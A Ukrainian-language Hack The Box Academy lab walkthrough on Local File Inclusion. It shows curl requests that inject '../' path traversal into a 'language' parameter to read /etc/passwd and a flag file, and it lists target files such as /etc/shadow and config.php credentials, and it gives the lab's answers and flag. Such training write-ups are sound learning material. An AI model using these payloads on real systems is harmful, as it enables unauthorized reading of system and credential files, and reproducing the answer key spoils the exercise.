## File Inclusion — Local File Inclusion (LFI): Path Traversal

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [Local File Inclusion](https://academy.hackthebox.com/app/module/23/section/251)
**Q1:** Ім'я юзера на `b` → **`barry`**
**Q2:** Вміст `flag.txt` → **`HTB{n3v3r_tru$t_u$3r_!nput}`**

***

## Концепція

**LFI (Local File Inclusion)** — GET-параметр `?language=` передається напряму у функцію `include()`/`require()` без валідації. Підставляємо path traversal (`../`) щоб вийти з webroot і читати довільні файли системи.

***

## Крок 1 — Читаємо `/etc/passwd` (Q1)

```bash
curl -s "http://TARGET_IP:PORT/index.php?language=../../../../etc/passwd" | grep "^b"
```

**Вивід:**
```
bin:x:2:2:bin:/bin:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
barry:x:1000:1000::/home/barry:/bin/sh
```

Юзер з UID 1000 (реальний системний користувач) — **`barry`**.

> `../../../../` — чотири рівні вгору від webroot до `/`. Кількість `../` залежить від глибини webroot, зазвичай 3–5 достатньо.

***

## Крок 2 — Читаємо довільний файл (Q2)

```bash
curl -s "http://TARGET_IP:PORT/index.php?language=../../../../usr/share/flags/flag.txt" | grep "HTB{"
```

**Вивід:**
```
HTB{n3v3r_tru$t_u$3r_!nput}
```

> Прапор вбудований у HTML-відповідь — тому `grep "HTB{"` фільтрує з повної сторінки.

***

## Корисні файли для LFI

| Файл | Що дає |
|---|---|
| `/etc/passwd` | Список користувачів системи |
| `/etc/shadow` | Хеші паролів (потребує root) |
| `/etc/hosts` | Внутрішня мережева карта |
| `/proc/self/environ` | Env змінні процесу (може містити секрети) |
| `/var/log/apache2/access.log` | Log poisoning вектор |
| `/var/www/html/config.php` | DB credentials |
| `../../../../etc/passwd` | Стандартний тест LFI |

***

## Відповіді

| Питання | Відповідь |
|---|---|
| Q1: Юзер на `b` | `barry` |
| Q2: Вміст `flag.txt` | `HTB{n3v3r_tru$t_u$3r_!nput}` |
